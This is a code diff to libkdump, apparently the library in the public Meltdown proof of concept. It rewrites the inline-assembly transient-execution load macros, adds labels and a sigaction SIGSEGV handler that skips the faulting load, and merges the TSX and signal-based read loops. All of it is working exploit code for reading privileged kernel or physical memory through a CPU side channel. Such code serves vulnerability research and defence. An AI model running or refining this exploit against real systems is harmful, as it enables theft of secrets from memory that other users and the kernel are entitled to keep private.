@@ -1,3 +1,7 @@
+
+/* vim: set ss=2 tw=2 ts=2 sw=2 sts=2 expandtab : */
+#define _GNU_SOURCE
+
 #include "libkdump.h"
 #include <cpuid.h>
 #include <errno.h>
@@ -5,8 +9,8 @@
 #include <memory.h>
 #include <pthread.h>
 #include <sched.h>
-#include <setjmp.h>
 #include <signal.h>
+#include <ucontext.h>
 #include <stdarg.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -14,8 +18,6 @@
 libkdump_config_t libkdump_auto_config = {0};
 
 // ---------------------------------------------------------------------------
-static jmp_buf buf;
-
 static char *_mem = NULL, *mem = NULL;
 static pthread_t *load_thread;
 static size_t phys = 0;
@@ -45,11 +47,12 @@ static libkdump_config_t config;
 // ---------------------------------------------------------------------------
 #define meltdown                                                               \
   asm volatile("1:\n"                                                          \
-               "movq (%%rsi), %%rsi\n"                                         \
-               "movzx (%%rcx), %%rax\n"                                         \
+               "should_fail_here:\n"                                           \
+               "movzx (%%rcx), %%rax\n"                                        \
                "shl $12, %%rax\n"                                              \
                "jz 1b\n"                                                       \
                "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
+               "stopspeculate: nop\n"                                          \
                :                                                               \
                : "c"(phys), "b"(mem), "S"(0)                                   \
                : "rax");
@@ -57,19 +60,23 @@ static libkdump_config_t config;
 // ---------------------------------------------------------------------------
 #define meltdown_nonull                                                        \
   asm volatile("1:\n"                                                          \
-               "movzx (%%rcx), %%rax\n"                                         \
+               "should_fail_here:\n"                                           \
+               "movzx (%%rcx), %%rax\n"                                        \
                "shl $12, %%rax\n"                                              \
                "jz 1b\n"                                                       \
                "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
+               "stopspeculate: nop\n"                                          \
                :                                                               \
                : "c"(phys), "b"(mem)                                           \
                : "rax");
 
 // ---------------------------------------------------------------------------
 #define meltdown_fast                                                          \
-  asm volatile("movzx (%%rcx), %%rax\n"                                         \
+  asm volatile("should_fail_here:\n"                                           \
+               "movzx (%%rcx), %%rax\n"                                        \
                "shl $12, %%rax\n"                                              \
                "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
+               "stopspeculate: nop\n"                                          \
                :                                                               \
                : "c"(phys), "b"(mem)                                           \
                : "rax");
@@ -79,11 +86,12 @@ static libkdump_config_t config;
 // ---------------------------------------------------------------------------
 #define meltdown                                                               \
  asm volatile("1:\n"                                                           \
-              "movl (%%esi), %%esi\n"                                          \
-              "movzx (%%ecx), %%eax\n"                                          \
+              "should_fail_here:\n"                                            \
+              "movzx (%%ecx), %%eax\n"                                         \
               "shl $12, %%eax\n"                                               \
               "jz 1b\n"                                                        \
               "mov (%%ebx,%%eax,1), %%ebx\n"                                   \
+              "stopspeculate: nop\n"                                           \
               :                                                                \
               : "c"(phys), "b"(mem), "S"(0)                                    \
               : "eax");
@@ -91,19 +99,23 @@ static libkdump_config_t config;
 // ---------------------------------------------------------------------------
 #define meltdown_nonull                                                        \
   asm volatile("1:\n"                                                          \
-               "movzx (%%ecx), %%eax\n"                                         \
+               "should_fail_here:\n"                                           \
+               "movzx (%%ecx), %%eax\n"                                        \
                "shl $12, %%eax\n"                                              \
                "jz 1b\n"                                                       \
                "mov (%%ebx,%%eax,1), %%ebx\n"                                  \
+               "stopspeculate: nop\n"                                          \
                :                                                               \
                : "c"(phys), "b"(mem)                                           \
                : "eax");
 
 // ---------------------------------------------------------------------------
 #define meltdown_fast                                                          \
-  asm volatile("movzx (%%ecx), %%eax\n"                                         \
+  asm volatile("should_fail_here:\n"                                           \
+               "movzx (%%ecx), %%eax\n"                                        \
                "shl $12, %%eax\n"                                              \
                "mov (%%ebx,%%eax,1), %%ebx\n"                                  \
+               "stopspeculate: nop\n"                                          \
                :                                                               \
                : "c"(phys), "b"(mem)                                           \
                : "eax");
@@ -341,18 +353,38 @@ static int check_config() {
 }
 
 // ---------------------------------------------------------------------------
-static void unblock_signal(int signum __attribute__((__unused__))) {
-  sigset_t sigs;
-  sigemptyset(&sigs);
-  sigaddset(&sigs, signum);
-  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
-}
+#ifdef __x86_64__
+# define REG_IP REG_RIP
+#else /* __i386__ */
+# define REG_IP REG_EIP
+#endif
 
-// ---------------------------------------------------------------------------
-static void segfault_handler(int signum) {
-  (void)signum;
-  unblock_signal(SIGSEGV);
-  longjmp(buf, 1);
+extern char should_fail_here[];
+extern char stopspeculate[];
+
+struct sigaction segv_action_orig;
+
+static void segfault_action(int sig, siginfo_t *siginfo, void *context)
+{
+  ucontext_t *ucontext = context;
+  long long *prip = &ucontext->uc_mcontext.gregs[REG_IP];
+
+  if (*prip != (unsigned long) should_fail_here) {
+    if (segv_action_orig.sa_handler != NULL &&
+        !(segv_action_orig.sa_flags & SA_SIGINFO)) {
+      segv_action_orig.sa_handler(sig);
+    } else if (segv_action_orig.sa_sigaction != NULL &&
+               (segv_action_orig.sa_flags & SA_SIGINFO)) {
+      segv_action_orig.sa_sigaction(sig, siginfo, context);
+    } else {
+      fprintf(stderr, "Segmentation fault\n");
+      abort();
+    }
+    return;
+  }
+
+  *prip  = (unsigned long)stopspeculate;
+  return;
 }
 
 // ---------------------------------------------------------------------------
@@ -363,22 +395,21 @@ libkdump_config_t libkdump_get_autoconfig() {
 
 // ---------------------------------------------------------------------------
 int libkdump_init(const libkdump_config_t configuration) {
-  int j;
+  int j, nthreads;
   config = configuration;
+
   if (memcmp(&config, &libkdump_auto_config, sizeof(libkdump_config_t)) == 0) {
     auto_config();
   }
 
   int err = check_config();
-  if (err != 0) {
-    errno = err;
+  if (err != 0)
     return -1;
-  }
+
   _mem = malloc(4096 * 300);
-  if (!_mem) {
-    errno = ENOMEM;
-    return -1;
-  }
+  if (!_mem)
+    goto err;
+
   mem = (char *)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
   memset(mem, 0xab, 4096 * 290);
 
@@ -387,6 +418,9 @@ int libkdump_init(const libkdump_config_t configuration) {
   }
 
   load_thread = malloc(sizeof(pthread_t) * config.load_threads);
+  if (load_thread == NULL)
+    goto err;
+
   void *thread_func;
   switch (config.load_type) {
   case IO:
@@ -400,37 +434,49 @@ int libkdump_init(const libkdump_config_t configuration) {
     thread_func = nopthread;
   }
 
-  for (j = 0; j < config.load_threads; j++) {
-    int r = pthread_create(&load_thread[j], 0, thread_func, 0);
-    if (r != 0) {
-      int k;
-      for (k = 0; k < j; k++) {
-        pthread_cancel(load_thread[k]);
-      }
-      free(load_thread);
-      free(_mem);
-      errno = r;
-      return -1;
-    }
+  for (nthreads = 0; nthreads < config.load_threads; nthreads++) {
+    int r = pthread_create(&load_thread[nthreads], 0, thread_func, 0);
+    if (r < 0)
+      goto err;
   }
-  debug(SUCCESS, "Started %d load threads\n", config.load_threads);
+  debug(SUCCESS, "Started %d load threads\n", nthreads);
 
   if (config.fault_handling == SIGNAL_HANDLER) {
-    if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
+    struct sigaction segv_action = {
+      .sa_sigaction = segfault_action,
+      .sa_flags = SA_SIGINFO
+    };
+
+    if (sigaction(SIGSEGV, &segv_action, &segv_action_orig) < 0) {
       debug(ERROR, "Failed to setup signal handler\n");
-      libkdump_cleanup();
-      return -1;
+      goto err;
     }
     debug(SUCCESS, "Successfully setup signal handler\n");
   }
   return 0;
+
+err: ;
+  int k, errsv = errno;
+  if (load_thread)
+    for (k = 0; k < nthreads; k++) {
+      pthread_cancel(load_thread[k]);
+    }
+
+  free(load_thread);
+  load_thread = NULL;
+
+  free(_mem);
+  _mem = NULL;
+
+  errno = errsv;
+  return -1;
 }
 
 // ---------------------------------------------------------------------------
 int libkdump_cleanup() {
   int j;
   if (config.fault_handling == SIGNAL_HANDLER) {
-    signal(SIGSEGV, SIG_DFL);
+    sigaction(SIGSEGV, &segv_action_orig, NULL);
   }
 
   for (j = 0; j < config.load_threads; j++) {
@@ -475,40 +521,25 @@ static int __attribute__((always_inline)) read_value() {
 }
 
 // ---------------------------------------------------------------------------
-int __attribute__((optimize("-Os"), noinline)) libkdump_read_tsx() {
+static int
+__attribute__((optimize("-Os"), noinline))
+libkdump_read_once(int tsx) {
+  size_t retries = config.retries + 1;
+  uint64_t start = 0, end = 0;
+
+  while (retries--) {
 #ifndef NO_TSX
-  size_t retries = config.retries + 1;
-  uint64_t start = 0, end = 0;
-
-  while (retries--) {
-    if (xbegin() == _XBEGIN_STARTED) {
-      MELTDOWN;
-      xend();
-    }
-    int i;
-    for (i = 0; i < 256; i++) {
-      if (flush_reload(mem + i * 4096)) {
-        if (i >= 1) {
-          return i;
-        }
-      }
-      sched_yield();
-    }
-    sched_yield();
-  }
+    int do_xbegin_xend = tsx;
+    if (do_xbegin_xend && xbegin() != _XBEGIN_STARTED)
+      do_xbegin_xend = 0;
 #endif
-  return 0;
-}
 
-// ---------------------------------------------------------------------------
-int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
-  size_t retries = config.retries + 1;
-  uint64_t start = 0, end = 0;
+    MELTDOWN;
 
-  while (retries--) {
-    if (!setjmp(buf)) {
-      MELTDOWN;
-    }
+#ifndef NO_TSX
+    if (do_xbegin_xend)
+      xend();
+#endif
 
     int i;
     for (i = 0; i < 256; i++) {
@@ -536,11 +567,7 @@ int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) {
   sched_yield();
 
   for (i = 0; i < config.measurements; i++) {
-    if (config.fault_handling == TSX) {
-      r = libkdump_read_tsx();
-    } else {
-      r = libkdump_read_signal_handler();
-    }
+    r = libkdump_read_once(config.fault_handling == TSX);
     res_stat[r]++;
   }
   int max_v = 0, max_i = 0;
